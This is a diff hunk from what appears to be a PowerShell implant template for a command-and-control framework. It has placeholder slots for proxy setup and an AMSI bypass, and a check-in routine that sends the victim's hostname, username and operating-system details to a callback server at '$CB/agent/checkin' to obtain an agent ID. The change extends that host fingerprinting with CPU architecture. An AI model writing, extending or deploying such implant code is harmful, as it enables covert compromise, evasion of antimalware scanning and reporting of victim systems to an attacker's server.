@@ -6,7 +6,8 @@ $RetryMax = [RETRY_MAX]
 $Label = "[LABEL]"
 [PROXY_SETUP]
 [AMSI_BYPASS]
-$body = @{hostname=$env:COMPUTERNAME; username=$env:USERNAME; os_info=(Get-CimInstance Win32_OperatingSystem).Caption; script=$Label} | ConvertTo-Json
+$_arch=try{[System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture}catch{$env:PROCESSOR_ARCHITECTURE}
+$body = @{hostname=$env:COMPUTERNAME; username=$env:USERNAME; os_info=((Get-CimInstance Win32_OperatingSystem).Caption+" $_arch"); script=$Label} | ConvertTo-Json
 $resp = Invoke-RestMethod -Uri "$CB/agent/checkin" -Method Post -Body $body -ContentType 'application/json'
 $agentId = $resp.agent_id
 if (-not $agentId) { exit 1 }
